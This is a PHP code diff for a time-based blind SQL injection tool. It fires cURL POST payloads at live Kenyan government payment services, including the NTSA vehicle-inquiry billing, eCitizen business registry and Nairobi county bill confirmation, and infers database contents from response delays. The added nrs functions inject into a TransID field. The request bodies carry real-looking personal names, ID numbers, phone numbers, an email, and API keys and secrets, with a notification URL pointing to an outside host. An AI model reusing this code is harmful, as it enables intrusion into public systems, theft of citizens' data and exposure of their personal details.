@@ -461,7 +461,7 @@ function sql_cont($cont, $pr)
 }
 function pesaflow_b($injection, $i, $sleep_timer, $state)
 {
-    $injection = str_replace(' ','%20',$injection);
+    $injection = str_replace(' ', '%20', $injection);
     $sleep_a = $sleep_timer + 1;
     $sleep_b = $sleep_a * 1000;
     // $curl = curl_init();
@@ -554,7 +554,7 @@ function pesaflow_b($injection, $i, $sleep_timer, $state)
 
 function pesaflow($injection, $i, $sleep_timer, $state)
 {
-    $injection = str_replace(' ','%20',$injection);
+    $injection = str_replace(' ', '%20', $injection);
     $sleep_a = $sleep_timer + 1;
     $sleep_b = $sleep_a * 1000;
     // $curl = curl_init();
@@ -568,10 +568,10 @@ function pesaflow($injection, $i, $sleep_timer, $state)
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
         CURLOPT_CUSTOMREQUEST => 'POST',
-       // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
+        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
         CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164'%2b" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
         //CURLOPT_POSTFIELDS => "amountExpected=250.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR13%22)&billRefNumber=4MXRN9&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Fsuccess&clientEmail=Waroruaalex640%40gmail.com&clientIDNumber=39290974&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=ALEX%20WANG\'ANG\'A%20WARORUA&clientType=1&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=NzM0ODk3NWMwMDlhOTUyYTMxYmVmMDRiZDQ2ODc3Y2ZiZDg4YmJlMDBlMzMwZTcxZmRlZmMzNWRhZWJhNWYzMA%3D%3D&serviceID=39",
-       
+
         CURLOPT_HTTPHEADER => array(
             'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
             'sec-ch-ua-mobile: ?0',
@@ -650,7 +650,7 @@ function pesaflow($injection, $i, $sleep_timer, $state)
 
 function kotnova($injection, $i, $sleep_timer, $state)
 {
-    $injection = str_replace(' ','%20',$injection);
+    $injection = str_replace(' ', '%20', $injection);
     $sleep_a = $sleep_timer + 1;
     $sleep_b = $sleep_a * 1000;
     // $curl = curl_init();
@@ -664,11 +664,11 @@ function kotnova($injection, $i, $sleep_timer, $state)
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
         CURLOPT_CUSTOMREQUEST => 'POST',
-       // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
+        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060164&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.php'%2b" . $injection . "%2b'&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
         CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060'%2b" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
-       // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
-       // CURLOPT_POSTFIELDS => "amountExpected=250.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR13%22)&billRefNumber=4MXRN9&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Fsuccess&clientEmail=Waroruaalex640%40gmail.com&clientIDNumber=39290974&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=ALEX%20WANG\'ANG\'A%20WARORUA&clientType=1&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=NzM0ODk3NWMwMDlhOTUyYTMxYmVmMDRiZDQ2ODc3Y2ZiZDg4YmJlMDBlMzMwZTcxZmRlZmMzNWRhZWJhNWYzMA%3D%3D&serviceID=39",
-       
+        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
+        // CURLOPT_POSTFIELDS => "amountExpected=250.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR13%22)&billRefNumber=4MXRN9&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Fsuccess&clientEmail=Waroruaalex640%40gmail.com&clientIDNumber=39290974&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=ALEX%20WANG\'ANG\'A%20WARORUA&clientType=1&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=NzM0ODk3NWMwMDlhOTUyYTMxYmVmMDRiZDQ2ODc3Y2ZiZDg4YmJlMDBlMzMwZTcxZmRlZmMzNWRhZWJhNWYzMA%3D%3D&serviceID=39",
+
         CURLOPT_HTTPHEADER => array(
             'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
             'sec-ch-ua-mobile: ?0',
@@ -747,7 +747,7 @@ function kotnova($injection, $i, $sleep_timer, $state)
 
 function kotnova_b($injection, $i, $sleep_timer, $state)
 {
-    $injection = str_replace(' ','%20',$injection);
+    $injection = str_replace(' ', '%20', $injection);
     $sleep_a = $sleep_timer + 1;
     $sleep_b = $sleep_a * 1000;
     //$curl = curl_init();
@@ -839,6 +839,192 @@ function kotnova_b($injection, $i, $sleep_timer, $state)
     // ...
 }
 
+function nrs_b($injection, $i, $sleep_timer, $state)
+{
+    $injection = str_replace(' ', '%20', $injection);
+    $sleep_a = $sleep_timer + 1;
+    $sleep_b = $sleep_a * 1000;
+    // $curl = curl_init();
+    global $curl;
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => '{
+            "mpesadetails": {
+                "FirstName": "John",
+                "BillRefNumber": "INVXX",
+                "TransAmount": "0",
+                "TransChannel": "mpesa",
+                "TransID":"SB5662FDXC' . "'" . '+' . $injection . '+' . "'" . '",
+            }
+        }',
+        CURLOPT_HTTPHEADER => array(
+            'Content-Type: application/x-www-form-urlencoded',
+            'host: nairobiservices.go.ke'
+        ),
+    ));
+
+    // Set the cURL timeout
+    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);
+
+    // Execute the cURL request
+    $response = curl_exec($curl);
+
+    // Check for cURL errors and the execution time
+    $curlError = curl_error($curl);
+    $curlInfo = curl_getinfo($curl);
+
+    // Close the cURL session
+    curl_close($curl);
+
+    $i = [
+        'message' => $i,
+    ];
+    // Check if the request timed out
+    if ($curlInfo['total_time'] >= 5) {
+        if ($state['id'] == 1) {
+            echo "result:" . $i['message'];
+            exit; // Terminate the script
+        } elseif ($state['id'] == 2) {
+            if (is_array($i)) {
+
+                $stateObject = base64_encode(json_encode($state));
+
+                if (!isset($state['statecode'])) {
+                    $stateCode = base64_encode(json_encode([$i['message']]));
+                } else {
+                    $stc_a = json_decode(base64_decode($state['statecode']), true);
+                    //$stc_a['statecode']
+                    array_push($stc_a, $i['message']);
+                    $stateCode = base64_encode(json_encode($stc_a));
+                    //$state['stateCode'] = '';
+                }
+                sql_verif($stateCode, $stateObject);
+
+                exit('The script touched exit!'); // Terminate the script
+            } else {
+                echo "Variable [i] should be an array with state 2!";
+                exit; // Terminate the script
+            }
+        } else {
+            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
+            exit; // Terminate the script
+        }
+    } else {
+        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
+    }
+
+    // Handle other possible errors or process the response as needed
+    if ($curlError) {
+        echo "cURL Error: " . $curlError;
+        exit; // Terminate the script
+    }
+
+    // Process the response as needed
+    // ...
+}
+
+function nrs($injection, $i, $sleep_timer, $state)
+{
+   // $injection = str_replace(' ', ' ', $injection);
+    $sleep_a = $sleep_timer + 1;
+    $sleep_b = $sleep_a * 1000;
+    $injk = "SB5662FDXC'+".$injection."+'";
+    //echo $injk.'<br/>';
+    // $curl = curl_init();
+    global $curl;
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => '{
+            "mpesadetails":{
+                "BillRefNumber":"BL-SE-XXXX",
+                "TransAmount":0,
+                "TransID":"'.$injk.'",
+                "MSISDN":"2547",
+                "FirstName":"John Doe",
+                "token":"122"
+            }
+        }',
+        CURLOPT_HTTPHEADER => array(
+            'Content-Type: application/json',
+            'host: nairobiservices.go.ke'
+        ),
+    ));
+
+    // Set the cURL timeout
+    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);
+
+    // Execute the cURL request
+    $response = curl_exec($curl);
+    //echo $response.'<br/>';
+
+    // Check for cURL errors and the execution time
+    $curlError = curl_error($curl);
+    $curlInfo = curl_getinfo($curl);
+    //echo $response;
+    // Close the cURL session
+    curl_close($curl);
+
+    $i = [
+        'message' => $i,
+    ];
+    // Check if the request timed out
+    if ($curlInfo['total_time'] >= 5) {
+        if ($state['id'] == 1) {
+            echo "result:" . $i['message'];
+            exit; // Terminate the script
+        } elseif ($state['id'] == 2) {
+            if (is_array($i)) {
+
+                $stateObject = base64_encode(json_encode($state));
+
+                if (!isset($state['statecode'])) {
+                    $stateCode = base64_encode(json_encode([$i['message']]));
+                } else {
+                    $stc_a = json_decode(base64_decode($state['statecode']), true);
+                    //$stc_a['statecode']
+                    array_push($stc_a, $i['message']);
+                    $stateCode = base64_encode(json_encode($stc_a));
+                    //$state['stateCode'] = '';
+                }
+                sql_verif($stateCode, $stateObject);
+
+                exit('The script touched exit!'); // Terminate the script
+            } else {
+                echo "Variable [i] should be an array with state 2!";
+                exit; // Terminate the script
+            }
+        } else {
+            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
+            exit; // Terminate the script
+        }
+    } else {
+        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
+       // echo "Script ended. Last parameter: " . ''.'<BR/>'.PHP_EOL;
+    }
+
+    // Handle other possible errors or process the response as needed
+    if ($curlError) {
+        echo "cURL Error: " . $curlError;
+        exit; // Terminate the script
+    }
+
+    // Process the response as needed
+    // ...
+}
 
 function length_finder($sleep_timer, $target, $parameter, $state)
 {
@@ -850,6 +1036,8 @@ function length_finder($sleep_timer, $target, $parameter, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     return $result;
@@ -888,7 +1076,10 @@ function count_checker($sleep_timer, $target, $query, $i, $hex, $state)
         $result = pesaflow($injection, $i, $sleep_timer, $state);
     } elseif ($target == 2) {
         $result = kotnova($injection, $i, $sleep_timer, $state);
+    } elseif ($target == 3) {
+        $result = nrs($injection, $i, $sleep_timer, $state);
     }
+
     if ($result == '' || $result = null) {
         return 'STATUS NULL';
     } else {
@@ -905,6 +1096,8 @@ function cr_1($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -923,6 +1116,8 @@ function cr_2($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -941,6 +1136,8 @@ function cr_3($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -961,6 +1158,8 @@ function cr_4($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
         if ($result == '' || $result == null) {
             return 'NO';
@@ -981,6 +1180,8 @@ function cr_5($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
         if ($result == '' || $result == null) {
             return 'NO';
@@ -1000,6 +1201,8 @@ function cr_6($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1018,6 +1221,8 @@ function cr_7($position, $parameter, $target, $sleep_timer, $state)
             $result = pesaflow($injection, $i, $sleep_timer, $state);
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
+        } elseif ($target == 3) {
+            $result = nrs($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1038,7 +1243,7 @@ function character_finder($position, $parameter, $target, $sleep_timer, $state)
     } elseif ($cr2 = cr_2($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
         return $cr2;
     } else {
-        return 'F1: No result(' . $position . ')';
+        return 'F1: No result(' . $position . ')<br/>';
     }
 }
 
